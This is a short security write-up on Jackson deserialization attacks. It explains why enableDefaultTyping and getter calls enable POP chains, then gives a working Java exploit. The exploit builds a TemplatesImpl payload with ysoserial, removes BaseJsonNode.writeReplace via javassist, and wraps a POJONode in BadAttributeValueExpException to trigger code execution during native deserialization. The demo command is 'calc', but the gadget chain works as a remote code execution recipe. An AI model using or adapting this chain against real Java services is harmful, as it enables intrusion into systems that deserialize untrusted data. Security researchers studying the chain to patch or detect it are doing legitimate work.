# Jackson deserialization

## Analysis

In `Jackson`, we use the `ObjectMapper.writeValueAsString()` method to serialize the class to a json string, and use the 
`ObjectMapper.readValue()` method to deserialize the json string to the class. However, similar to `Fastjson`, `Jackson` contains the `ObjectMapper.enableDefaultTyping()` setting, which can support deserialization of specified classes. 

Meanwhile, the `Jackson` deserialization process will call the `setter` and `getter` methods of the object. Therefore, the POP chain of `Jackson` is consistent with the chain of `Fastjson`.

## Native deserialization

The `BaseJsonNode` class, which is the parent class of the `POJONode` class, has a `toString()` method. In that method, the `writeValueAsString()` method will be called. Therefore, we can trigger a deserialization vulnerability by calling the `toString()` method of the `POJONode` class from the `readObject()` method of the `BadAttributeValueExpException` class.

### Code

```java
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;

public class Exp {
    public static void main(String[] args) throws Exception{
        Object template = Gadgets.createTemplatesImpl("calc");

        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass jsonNode = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
            CtMethod writeReplace = jsonNode.getDeclaredMethod("writeReplace");
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception ignored) {
        }

        POJONode node = new POJONode(template);

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field declaredField = badAttributeValueExpException.getClass().getDeclaredField("val");
        Reflections.setAccessible(declaredField);
        declaredField.set(badAttributeValueExpException, node);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(badAttributeValueExpException);
    }
}
```

### Note

Here, we use the reflection to delete the `writeReplace()` method of the `BaseJsonNode` class, because this method is called during serialization and an exception will be thrown.